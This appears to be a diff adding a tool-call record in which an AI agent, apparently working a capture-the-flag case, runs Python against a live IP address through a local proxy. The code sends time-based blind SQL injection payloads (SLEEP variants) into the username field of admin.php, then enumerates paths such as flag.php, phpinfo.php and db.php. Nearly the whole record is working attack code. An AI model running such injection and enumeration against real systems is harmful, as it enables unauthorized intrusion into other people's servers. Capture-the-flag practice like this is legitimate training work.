@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport time, urllib.request, urllib.parse, urllib.error\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef login(user, pwd, tmo=30):\n    data = urllib.parse.urlencode({\"username\": user, \"password\": pwd, \"submit\": \"login\"}).encode()\n    t0 = time.time()\n    try:\n        with op.open(BASE + \"admin.php\", data=data, timeout=tmo) as r:\n            b = r.read()\n            return time.time() - t0, len(b), r.status\n    except Exception as e:\n        return time.time() - t0, -1, str(e)[:60]\n\nprint(\"[1] 基线\")\nfor _ in range(2):\n    d, n, s = login(\"admin\", \"x\")\n    print(\"    admin/x  %.2fs len=%s %s\" % (d, n, s))\n\nprint(\"[2] 时间盲注探测\")\npayloads = [\n    (\"admin' AND SLEEP(3)#\", \"x\"),\n    (\"admin' AND SLEEP(3)-- -\", \"x\"),\n    (\"admin' OR SLEEP(3)#\", \"x\"),\n    (\"admin' AND (SELECT 1 FROM (SELECT SLEEP(3))a)#\", \"x\"),\n    (\"admin\\\" AND SLEEP(3)#\", \"x\"),\n]\nfor u, p in payloads:\n    d, n, s = login(u, p)\n    flag = \"  <<< 有延时\" if d > 2.5 else \"\"\n    print(\"    %-44s %.2fs len=%s%s\" % (u, d, n, flag))\n\nprint(\"[3] 路径探测\")\nfor path in [\"admin.php\", \"index.php\", \"flag.php\", \"robots.txt\", \"1.txt\",\n             \"admin/\", \"uploads/\", \"phpinfo.php\", \"info.php\", \"test.php\",\n             \"cookie.php\", \"xss.php\", \"manage.php\", \"login.php\", \"db.php\"]:\n    try:\n        with op.open(BASE + path, timeout=15) as r:\n            b = r.read()\n            print(\"    %-14s %s len=%s\" % (path, r.status, len(b)))\n    except urllib.error.HTTPError as e:\n        print(\"    %-14s %s\" % (path, e.code))\n    except Exception as e:\n        print(\"    %-14s ERR %s\" % (path, str(e)[:50]))\n",
+    "timeout": 240,
+    "wp_purpose": "检测 admin.php 时间盲注并枚举路径",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "operation_id": "ec0c9da1895846009f71c0340d224bdc"
+}
